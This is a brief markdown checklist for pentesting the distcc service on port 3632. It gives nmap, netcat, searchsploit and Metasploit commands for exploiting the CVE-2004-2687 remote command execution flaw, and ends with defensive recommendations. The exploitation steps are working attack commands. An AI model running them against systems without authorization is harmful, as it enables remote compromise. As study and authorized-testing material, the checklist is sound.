# ‚úÖ Distcc Pentesting Checklist & Commands

---

## üéØ What am I realistically expecting to find here?

‚≠ê After enumerating distcc (port 3632), I realistically expect to find:

- [ ] Service banner confirming distccd running on port 3632
- [ ] Version information for mapping to known exploits (CVE-2004-2687)
- [ ] Ability to execute arbitrary system commands remotely
- [ ] Potential for immediate remote code execution (shell) on the target

## ‚úÖ Distcc Pentest Checklist

- [ ] **Banner Grabbing**
    ```bash
    nc -vn <IP> 3632
    ```

- [ ] **Service Version Identification**
    - Look for version details in banners or Nmap output.
    ```bash
    nmap -sV -p 3632 <IP>
    ```

- [ ] **Searchsploit for Known Exploits**
    ```bash
    searchsploit distcc
    searchsploit <service info from nmap>
    ```

- [ ] **Check for CVE-2004-2687 - Remote Command Execution**

    - **Nmap NSE Script**
        ```bash
        nmap -p 3632 <IP> --script distcc-exec --script-args="distcc-exec.cmd='id'"
        ```

    - **Metasploit Module**
        ```bash
        msfconsole
        use exploit/unix/misc/distcc_exec
        set RHOSTS <IP>
        run
        ```

## ‚úÖ Defensive Recommendations

- Restrict distccd to trusted IP ranges
- Disable or remove distccd service if not required
- Apply any available patches or upgrades
- Monitor for unexpected connections on port 3632
